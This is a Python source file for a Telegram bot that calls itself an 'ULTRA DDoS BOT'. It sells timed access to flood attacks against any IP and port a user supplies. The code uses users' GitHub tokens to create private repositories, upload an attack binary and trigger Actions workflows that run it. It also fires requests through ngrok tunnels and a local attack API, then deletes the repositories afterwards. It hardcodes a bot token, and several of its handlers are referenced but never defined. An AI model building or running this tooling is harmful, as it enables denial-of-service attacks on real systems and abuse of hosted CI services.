import os
import json
import time
import random
import string
import base64
import asyncio
import logging
import socket
import subprocess
import threading
import aiohttp
import concurrent.futures
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List

import requests
import yaml
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ---------------- Configuration ----------------
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8429281956:AAEnKnH1OZSwI6BdzJUqmbZpgqObJ1AZ7JY")
DEVELOPER_TAG = "@DESTROYER_REAL_OFC"

# Owner and admin control
OWNER_IDS = {8484157475}
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
TOKENS_FILE = "tokens.txt"
TOKENS_STATUS_FILE = "tokens.json"
BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)
DEFAULT_THREADS_FILE = "threads.json"
CONCURRENT_FILE = "concurrent.json"

# Track running attacks per chat
ACTIVE_ATTACKS: Dict[int, List[Dict]] = {}

# ---------------- Ultra Tunnel Manager ----------------
class UltraTunnelManager:
    def __init__(self):
        self.tunnels = {}
        self.base_port = 3001
        self.ngrok_process = None
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
        
    def start_ngrok_service(self):
        """Start ngrok service with ultra performance"""
        try:
            subprocess.run(["pkill", "ngrok"], capture_output=True)
            time.sleep(1)
            
            self.ngrok_process = subprocess.Popen(
                ["ngrok", "start", "--none", "--log=stdout"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(2)
            print("🚀 Ultra Ngrok service started")
            return True
        except Exception as e:
            print(f"❌ Ngrok service error: {e}")
            return False
    
    async def create_bulk_tunnels(self, tokens: List[str]) -> Dict[str, str]:
        """Create multiple tunnels simultaneously for instant attacks"""
        results = {}
        
        async def create_single_tunnel(token):
            try:
                port = self.base_port + len(self.tunnels)
                
                tunnel_config = {
                    "name": f"attack_{port}",
                    "proto": "http",
                    "addr": port
                }
                
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "http://localhost:4040/api/tunnels",
                        json=tunnel_config,
                        timeout=10
                    ) as response:
                        if response.status == 201:
                            data = await response.json()
                            public_url = data['public_url']
                            self.tunnels[token] = {
                                "port": port,
                                "url": public_url,
                                "api_url": f"{public_url}/v1/start",
                                "status": "active",
                                "start_time": datetime.utcnow()
                            }
                            return token, public_url
            except Exception as e:
                print(f"❌ Tunnel failed for {token[:10]}: {e}")
            return token, None
        
        # Create all tunnels concurrently
        tasks = [create_single_tunnel(token) for token in tokens]
        results_list = await asyncio.gather(*tasks)
        
        for token, url in results_list:
            if url:
                results[token] = url
        
        print(f"🎯 Bulk tunnels created: {len(results)}/{len(tokens)}")
        return results
    
    def get_tunnel_status(self):
        """Get comprehensive tunnel status"""
        status = {}
        for token, data in self.tunnels.items():
            status[token[:10] + "..."] = {
                "url": data['url'],
                "status": data['status'],
                "port": data['port'],
                "uptime": str(datetime.utcnow() - data['start_time']).split('.')[0]
            }
        return status
    
    def stop_tunnel(self, token: str):
        """Stop specific tunnel"""
        if token in self.tunnels:
            try:
                tunnel_name = f"attack_{self.tunnels[token]['port']}"
                requests.delete(f"http://localhost:4040/api/tunnels/{tunnel_name}", timeout=3)
                del self.tunnels[token]
            except:
                pass
    
    def stop_all_tunnels(self):
        """Stop all tunnels instantly"""
        for token in list(self.tunnels.keys()):
            self.stop_tunnel(token)
        
        if self.ngrok_process:
            self.ngrok_process.terminate()
        
        subprocess.run(["pkill", "ngrok"], capture_output=True)

    def get_active_tunnel_count(self):
        return len(self.tunnels)

# Global ultra tunnel manager
ultra_tunnel_manager = UltraTunnelManager()

# ---------------- Power Boost Configuration ----------------
POWER_BOOSTS = {
    "TURBO": {"multiplier": 2.0, "color": "🟡"},
    "ULTRA": {"multiplier": 3.0, "color": "🟠"}, 
    "MAXIMUM": {"multiplier": 5.0, "color": "🔴"}
}

# ---------------- Instant Attack Manager ----------------
class InstantAttackManager:
    def __init__(self):
        self.attack_queue = asyncio.Queue()
        self.is_running = True
        self.worker_task = None
        
    async def start_worker(self):
        """Start attack worker for instant processing"""
        self.worker_task = asyncio.create_task(self._process_attacks())
        
    async def _process_attacks(self):
        """Process attacks instantly from queue"""
        while self.is_running:
            try:
                attack_data = await asyncio.wait_for(self.attack_queue.get(), timeout=1.0)
                await self._execute_instant_attack(attack_data)
                self.attack_queue.task_done()
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                print(f"❌ Attack worker error: {e}")
                
    async def _execute_instant_attack(self, attack_data: Dict):
        """Execute attack with maximum speed"""
        try:
            context = attack_data['context']
            chat_id = attack_data['chat_id']
            ip = attack_data['ip']
            port = attack_data['port']
            duration = attack_data['duration']
            uid = attack_data['uid']
            power_mode = attack_data.get('power_mode', 'TURBO')
            
            # Get user tokens instantly
            user_tokens = self._load_user_tokens_instant(uid)
            valid_tokens = [t for t in user_tokens if self._validate_token_instant(t)]
            
            if not valid_tokens:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="❌ <b>No valid tokens found for instant attack!</b>",
                    parse_mode='HTML'
                )
                return
            
            # Create tunnels instantly
            tunnel_results = await ultra_tunnel_manager.create_bulk_tunnels(valid_tokens)
            
            # Launch all attacks simultaneously
            attack_tasks = []
            
            # GitHub Attacks
            if os.path.exists(BINARY_PATH):
                for token in valid_tokens[:3]:  # Limit to avoid rate limits
                    task = asyncio.create_task(
                        self._launch_github_attack(token, ip, port, duration)
                    )
                    attack_tasks.append(task)
            
            # Tunnel Attacks
            for token, tunnel_url in tunnel_results.items():
                task = asyncio.create_task(
                    self._launch_tunnel_attack(tunnel_url, ip, port, duration)
                )
                attack_tasks.append(task)
            
            # Power Boost - Additional API calls based on mode
            boost_multiplier = POWER_BOOSTS[power_mode]["multiplier"]
            extra_calls = int(len(valid_tokens) * boost_multiplier)
            
            for i in range(min(extra_calls, 20)):  # Max 20 extra calls
                task = asyncio.create_task(
                    self._launch_api_attack(ip, port, duration)
                )
                attack_tasks.append(task)
            
            # Wait for all attacks to start
            if attack_tasks:
                await asyncio.gather(*attack_tasks, return_exceptions=True)
            
            # Send success message
            success_msg = f"""
🎯 <b>INSTANT ATTACK LAUNCHED!</b>

╔══════════════════════╗
║     ⚡ POWER MODE     ║  
╠══════════════════════╣
║ • Target: <code>{ip}:{port}</code>
║ • Duration: {duration}s
║ • Mode: {power_mode} {POWER_BOOSTS[power_mode]["color"]}
║ • Tokens: {len(valid_tokens)}
║ • Tunnels: {len(tunnel_results)}
║ • Total Attacks: {len(attack_tasks)}
╚══════════════════════╝

🔥 <i>All systems firing at maximum power!</i>
            """.strip()
            
            await context.bot.send_message(chat_id=chat_id, text=success_msg, parse_mode='HTML')
            
            # Schedule cleanup
            asyncio.create_task(self._cleanup_after_attack(tunnel_results, duration))
            
        except Exception as e:
            print(f"❌ Instant attack error: {e}")
    
    def _load_user_tokens_instant(self, uid: int) -> List[str]:
        """Ultra-fast token loading"""
        try:
            if not os.path.exists(TOKENS_FILE):
                return []
            
            with open(TOKENS_FILE, "r", encoding="utf-8") as f:
                return [
                    line.split(":", 1)[1].strip() 
                    for line in f 
                    if ":" in line and line.startswith(f"{uid}:")
                ]
        except:
            return []
    
    def _validate_token_instant(self, token: str) -> bool:
        """Fast token validation"""
        try:
            headers = {"Authorization": f"token {token}"}
            response = requests.get(
                "https://api.github.com/user",
                headers=headers,
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    async def _launch_github_attack(self, token: str, ip: str, port: str, duration: str):
        """Launch GitHub attack instantly"""
        try:
            if not os.path.exists(BINARY_PATH):
                return
                
            repo_name = f"attack-{int(time.time())}-{random.randint(1000,9999)}"
            repo_data = self._gh_create_repo_instant(token, repo_name)
            
            if not repo_data:
                return
                
            full_name = repo_data["full_name"]
            owner, repo = full_name.split("/", 1)
            
            # Create workflow
            threads = self._get_default_threads()
            wf_text = self._build_workflow_instant(ip, port, duration, threads).encode()
            
            # Upload files quickly
            self._gh_put_file_instant(token, owner, repo, ".github/workflows/run.yml", wf_text, "Attack")
            
            with open(BINARY_PATH, "rb") as f:
                self._gh_put_file_instant(token, owner, repo, BINARY_NAME, f.read(), "Binary")
            
            # Dispatch
            self._gh_dispatch_instant(token, owner, repo, "run.yml")
            
            # Quick cleanup
            asyncio.create_task(self._quick_cleanup_repo(token, full_name, duration))
            
        except Exception as e:
            print(f"❌ GitHub attack error: {e}")
    
    async def _launch_tunnel_attack(self, tunnel_url: str, ip: str, port: str, duration: str):
        """Launch tunnel attack instantly"""
        try:
            url = f"{tunnel_url}?target={ip}&port={port}&time={duration}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as response:
                    if response.status == 200:
                        print(f"✅ Tunnel attack: {tunnel_url}")
        except:
            pass
    
    async def _launch_api_attack(self, ip: str, port: str, duration: str):
        """Launch API attack instantly"""
        try:
            url = f"http://localhost:3000/v1/start?target={ip}&port={port}&time={duration}"
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=3) as response:
                    if response.status == 200:
                        print(f"✅ API attack: {ip}:{port}")
        except:
            pass
    
    async def _cleanup_after_attack(self, tunnel_results: Dict, duration: str):
        """Cleanup after attack duration"""
        await asyncio.sleep(int(duration) + 5)
        
        for token in tunnel_results.keys():
            ultra_tunnel_manager.stop_tunnel(token)
    
    async def _quick_cleanup_repo(self, token: str, full_name: str, duration: str):
        """Quick repo cleanup"""
        await asyncio.sleep(int(duration) + 10)
        try:
            requests.delete(
                f"https://api.github.com/repos/{full_name}",
                headers={"Authorization": f"token {token}"},
                timeout=5
            )
        except:
            pass
    
    def _gh_create_repo_instant(self, token: str, name: str):
        try:
            response = requests.post(
                "https://api.github.com/user/repos",
                headers={"Authorization": f"token {token}"},
                json={"name": name, "private": True},
                timeout=10
            )
            return response.json() if response.status_code in (201, 202) else None
        except:
            return None
    
    def _gh_put_file_instant(self, token: str, owner: str, repo: str, path: str, content: bytes, message: str):
        try:
            b64 = base64.b64encode(content).decode()
            requests.put(
                f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
                headers={"Authorization": f"token {token}"},
                json={"message": message, "content": b64},
                timeout=10
            )
        except:
            pass
    
    def _gh_dispatch_instant(self, token: str, owner: str, repo: str, workflow: str):
        try:
            requests.post(
                f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow}/dispatches",
                headers={"Authorization": f"token {token}"},
                json={"ref": "main"},
                timeout=5
            )
        except:
            pass
    
    def _build_workflow_instant(self, ip: str, port: str, duration: str, threads: int) -> str:
        wf = {
            "name": "Ultra Attack",
            "on": {"workflow_dispatch": {}},
            "jobs": {
                "attack": {
                    "runs-on": "ubuntu-latest",
                    "steps": [
                        {"uses": "actions/checkout@v4"},
                        {"run": f"chmod 755 {BINARY_NAME}"},
                        {"run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                    ]
                }
            }
        }
        return yaml.safe_dump(wf, sort_keys=False)
    
    def _get_default_threads(self):
        try:
            with open(DEFAULT_THREADS_FILE, "r") as f:
                data = json.load(f)
                return data.get("threads", 4000)
        except:
            return 4000

# Global instant attack manager
instant_attack_manager = InstantAttackManager()

# ---------------- Utility Functions ----------------
def load_json(path: str, default: Any) -> Any:
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def save_json(path: str, data: Any) -> None:
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

def set_concurrent(value: int) -> None:
    save_json(CONCURRENT_FILE, {"concurrent": int(value)})

def get_concurrent() -> int:
    data = load_json(CONCURRENT_FILE, {"concurrent": 3})
    return int(data.get("concurrent", 3))

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    return load_json(USERS_FILE, {})

def is_user_approved(user_id: int) -> bool:
    users = get_users()
    info = users.get(str(user_id))
    if not info:
        return False
    try:
        expires = datetime.fromisoformat(info["expires"].replace("Z", "+00:00"))
        return datetime.utcnow().astimezone(expires.tzinfo) <= expires
    except Exception:
        return False

def add_user(user_id: int, days: int) -> None:
    users = get_users()
    expires = datetime.utcnow() + timedelta(days=int(days))
    users[str(user_id)] = {"expires": expires.replace(microsecond=0).isoformat() + "Z"}
    save_json(USERS_FILE, users)

def remove_user(user_id: int) -> None:
    users = get_users()
    users.pop(str(user_id), None)
    save_json(USERS_FILE, users)

def save_token_line(uid: int, token: str) -> None:
    with open(TOKENS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid}:{token}\n")

def load_all_token_lines() -> List[str]:
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ":" in ln]

def validate_github_token(token: str) -> bool:
    try:
        headers = {"Authorization": f"token {token}"}
        response = requests.get("https://api.github.com/user", headers=headers, timeout=10)
        return response.status_code == 200
    except:
        return False

# ---------------- Ultra Power Commands ----------------
async def cmd_instant(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ULTRA INSTANT ATTACK - No delays, maximum power"""
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>Access Denied</b>", parse_mode='HTML')
            return
        
        if len(context.args) < 3:
            await update.message.reply_text(
                "⚡ <b>INSTANT ATTACK USAGE:</b>\n"
                "<code>/instant ip port duration</code>\n"
                "<code>/instant ip port duration TURBO</code>\n"
                "<code>/instant ip port duration ULTRA</code>\n"
                "<code>/instant ip port duration MAXIMUM</code>\n\n"
                "💡 <i>Power Modes: TURBO (2x) • ULTRA (3x) • MAXIMUM (5x)</i>",
                parse_mode='HTML'
            )
            return
        
        ip, port, duration = context.args[:3]
        power_mode = context.args[3].upper() if len(context.args) > 3 else "TURBO"
        
        if power_mode not in POWER_BOOSTS:
            power_mode = "TURBO"
        
        # Validate input
        try:
            int(port)
            int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return
        
        # Send instant response
        await update.message.reply_text("🚀 <b>LAUNCHING INSTANT ATTACK...</b>", parse_mode='HTML')
        
        # Queue attack for instant execution
        attack_data = {
            'context': context,
            'chat_id': chat_id,
            'ip': ip,
            'port': port,
            'duration': duration,
            'uid': uid,
            'power_mode': power_mode
        }
        
        await instant_attack_manager.attack_queue.put(attack_data)
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Instant Attack Error:</b> {str(e)}", parse_mode='HTML')

async def cmd_power(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show power modes and statistics"""
    power_msg = """
💥 <b>ULTRA POWER MODES</b>

╔══════════════════════╗
║     🚀 POWER MODES   ║
╠══════════════════════╣
║ • TURBO   🟡 2x Power
║ • ULTRA   🟠 3x Power  
║ • MAXIMUM 🔴 5x Power
╚══════════════════════╝

⚡ <b>INSTANT FEATURES:</b>
• Zero-delay attack start
• Auto-tunnel creation
• Parallel execution
• Power boosting

🎯 <b>USAGE:</b>
<code>/instant 1.1.1.1 80 60</code>
<code>/instant 1.1.1.1 80 60 ULTRA</code>

🔥 <i>Maximum destruction, minimum delay!</i>
    """.strip()
    
    await update.message.reply_text(power_msg, parse_mode='HTML')

async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user statistics with power info"""
    try:
        uid = update.effective_user.id
        
        # Load user data
        users = get_users()
        user_info = users.get(str(uid), {})
        
        # Calculate status
        status = "🔴 STANDARD"
        if user_info:
            try:
                expires_str = user_info.get("expires", "")
                if expires_str:
                    expires = datetime.fromisoformat(expires_str.replace("Z", "+00:00"))
                    days_left = max(0, (expires - datetime.utcnow()).days)
                    status = f"🟢 PREMIUM ({days_left} days)"
            except:
                status = "🟢 PREMIUM"
        
        # Count tokens
        user_tokens = [line.split(":", 1)[1] for line in load_all_token_lines() if line.startswith(f"{uid}:")]
        valid_tokens = [t for t in user_tokens if validate_github_token(t)]
        
        # Active tunnels
        active_tunnels = ultra_tunnel_manager.get_active_tunnel_count()
        
        stats_msg = f"""
📊 <b>ULTRA USER STATS</b>

╔══════════════════════╗
║     👤 USER INFO     ║
╠══════════════════════╣
║ • ID: <code>{uid}</code>
║ • Status: {status}
║ • Tokens: {len(valid_tokens)}/{len(user_tokens)}
║ • Active Tunnels: {active_tunnels}
║ • Admin: {'✅ YES' if is_admin(uid) else '❌ NO'}
╚══════════════════════╝

🎯 <b>POWER CAPABILITIES:</b>
• Instant Attack: ✅
• Auto-Tunnels: ✅  
• Power Modes: ✅
• Parallel Execution: ✅

💡 <i>Use /instant for maximum power attacks!</i>
        """.strip()
        
        await update.message.reply_text(stats_msg, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text("📊 <b>Basic Stats:</b>\n• User ID: {}\n• Status: ACTIVE".format(update.effective_user.id), parse_mode='HTML')

# ---------------- Enhanced Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_msg = """
🚀 <b>ULTRA DDoS BOT ACTIVATED</b>

╔══════════════════════╗
║     🆕 ULTRA FEATURES║
╠══════════════════════╣
║ • INSTANT Attacks
║ • AUTO-Tunnel Creation  
║ • POWER Boosting
║ • PARALLEL Execution
╚══════════════════════╝

⚡ <b>NEW COMMANDS:</b>
• <code>/instant</code> - Zero-delay attacks
• <code>/power</code> - Power mode info
• <code>/mystats</code> - User statistics

👑 <b>Developer:</b> {DEVELOPER_TAG}

💡 <i>Attacks start instantly with auto-tunnels!</i>
    """.strip()
    
    await update.message.reply_text(start_msg, parse_mode='HTML')

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_admin(user_id):
        help_text = """
🛠️ <b>ULTRA ADMIN COMMANDS</b>

<b>Instant Attacks:</b>
<code>/instant ip port duration</code> - Zero-delay attack
<code>/instant ip port duration MODE</code> - Power boosted

<b>Power Management:</b>  
<code>/power</code> - Show power modes
<code>/mystats</code> - User statistics
<code>/tunnels</code> - Tunnel status

<b>User Management:</b>
<code>/add userid days</code> - Add user
<code>/remove userid</code> - Remove user
<code>/users</code> - Users file

<b>Token Management:</b>
<code>/settoken</code> - Add tokens
<code>/check</code> - Check tokens

<b>Configuration:</b>
<code>/threads N</code> - Set threads
<code>/setconcurrent N</code> - Set concurrency
<code>/file</code> - Upload binary
        """.strip()
    else:
        help_text = """
🎯 <b>ULTRA USER COMMANDS</b>

<b>Instant Attacks:</b>
<code>/instant ip port duration</code> - Launch instantly
<code>/instant ip port duration MODE</code> - With power boost

<b>Power Modes:</b>
• TURBO 🟡 (2x power)
• ULTRA 🟠 (3x power) 
• MAXIMUM 🔴 (5x power)

<b>Information:</b>
<code>/power</code> - Power modes
<code>/mystats</code> - Your stats
<code>/tunnels</code> - Active tunnels

<b>Token Management:</b>
<code>/settoken</code> - Add tokens
<code>/check</code> - Check tokens

💡 <i>Attacks start instantly with auto-tunnels!</i>
        """.strip()
    
    await update.message.reply_text(help_text, parse_mode='HTML')

# Keep existing handlers but enhance them
async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enhanced attack with instant features"""
    try:
        uid = update.effective_user.id
        chat_id = update.effective_chat.id
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>Access Denied</b>", parse_mode='HTML')
            return
        
        if len(context.args) != 3:
            await update.message.reply_text("📋 <b>Usage:</b> <code>/attack ip port duration</code>", parse_mode='HTML')
            return
        
        ip, port, duration = context.args
        
        try:
            int(port)
            int(duration)
        except ValueError:
            await update.message.reply_text("❌ Port and duration must be integers")
            return
        
        # Use instant attack system
        attack_data = {
            'context': context,
            'chat_id': chat_id,
            'ip': ip,
            'port': port,
            'duration': duration,
            'uid': uid,
            'power_mode': 'TURBO'
        }
        
        await update.message.reply_text("🚀 <b>Launching Enhanced Attack...</b>", parse_mode='HTML')
        await instant_attack_manager.attack_queue.put(attack_data)
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Attack Error:</b> {str(e)}", parse_mode='HTML')

# Tunnel commands (keep from previous)
async def cmd_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show ultra tunnel status"""
    try:
        uid = update.effective_user.id
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>Access Denied</b>", parse_mode='HTML')
            return
        
        tunnel_status = ultra_tunnel_manager.get_tunnel_status()
        active_count = ultra_tunnel_manager.get_active_tunnel_count()
        
        if not tunnel_status:
            await update.message.reply_text("🌐 <b>No active tunnels - They create automatically during attacks!</b>", parse_mode='HTML')
            return
        
        status_msg = f"🌐 <b>ULTRA TUNNELS STATUS</b>\n\n"
        status_msg += f"📊 Total Active: {active_count}\n\n"
        
        for i, (token_prefix, tunnel_info) in enumerate(tunnel_status.items(), 1):
            status_msg += f"<b>Tunnel {i}:</b>\n"
            status_msg += f"• Token: {token_prefix}\n"
            status_msg += f"• URL: <code>{tunnel_info['url']}</code>\n"
            status_msg += f"• Port: {tunnel_info['port']}\n"
            status_msg += f"• Status: 🟢 {tunnel_info['status'].upper()}\n"
            status_msg += f"• Uptime: {tunnel_info['uptime']}\n\n"
        
        await update.message.reply_text(status_msg, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Tunnel Status Error:</b> {str(e)}", parse_mode='HTML')

async def cmd_cleartunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all tunnels"""
    try:
        uid = update.effective_user.id
        
        if not is_user_approved(uid):
            await update.message.reply_text("❌ <b>Access Denied</b>", parse_mode='HTML')
            return
        
        active_count = ultra_tunnel_manager.get_active_tunnel_count()
        ultra_tunnel_manager.stop_all_tunnels()
        
        await update.message.reply_text(f"🗑️ <b>Cleared {active_count} ultra tunnels</b>", parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Clear Tunnels Error:</b> {str(e)}", parse_mode='HTML')

# Add other existing handlers (settoken, check, users, etc.)
async def cmd_settoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        uid = update.effective_user.id
        
        if update.message.document and update.message.document.file_name.endswith(".txt"):
            file = await update.message.document.get_file()
            path = await file.download_to_drive()
            cnt = 0
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    tok = line.strip()
                    if tok:
                        save_token_line(uid, tok)
                        cnt += 1
            os.remove(path)
            await update.message.reply_text(f"✅ <b>Saved {cnt} ULTRA tokens</b>", parse_mode='HTML')
        else:
            text = update.message.text.replace("/settoken", "").strip() if update.message.text else ""
            if not text:
                await update.message.reply_text("📝 <b>Send PAT tokens or upload .txt file</b>", parse_mode='HTML')
                return
            tokens = [t.strip() for t in text.split() if t.strip()]
            for tok in tokens:
                save_token_line(uid, tok)
            await update.message.reply_text(f"✅ <b>Saved {len(tokens)} ULTRA tokens</b>", parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text("❌ Error saving tokens")

# Add other necessary handlers...

# ---------------- Application Setup ----------------
def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Ultra power commands
    app.add_handler(CommandHandler("instant", cmd_instant))
    app.add_handler(CommandHandler("power", cmd_power))
    app.add_handler(CommandHandler("mystats", cmd_mystats))
    
    # Enhanced commands
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("attack", cmd_attack))
    
    # Tunnel commands
    app.add_handler(CommandHandler("tunnels", cmd_tunnels))
    app.add_handler(CommandHandler("cleartunnels", cmd_cleartunnels))
    
    # Existing commands
    app.add_handler(CommandHandler("settoken", cmd_settoken))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("add", cmd_add))
    app.add_handler(CommandHandler("remove", cmd_remove))
    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("setconcurrent", cmd_setconcurrent))
    app.add_handler(CommandHandler("file", cmd_file))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    
    return app

# ---------------- Startup ----------------
import atexit

@atexit.register
def cleanup_on_exit():
    """Cleanup on exit"""
    print("🔄 Cleaning up ultra tunnels...")
    ultra_tunnel_manager.stop_all_tunnels()
    instant_attack_manager.is_running = False

async def startup_tasks():
    """Start background tasks"""
    await instant_attack_manager.start_worker()
    ultra_tunnel_manager.start_ngrok_service()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    print("💥 STARTING ULTRA DDoS BOT...")
    print("🚀 Features: Instant Attacks • Auto-Tunnels • Power Boosting")
    
    # Start background services
    asyncio.run(startup_tasks())
    
    app = build_app()
    
    try:
        app.run_polling()
    except KeyboardInterrupt:
        print("\n🛑 Ultra Bot stopped by user")
        ultra_tunnel_manager.stop_all_tunnels()
    except Exception as e:
        print(f"❌ Ultra Bot error: {e}")
        ultra_tunnel_manager.stop_all_tunnels()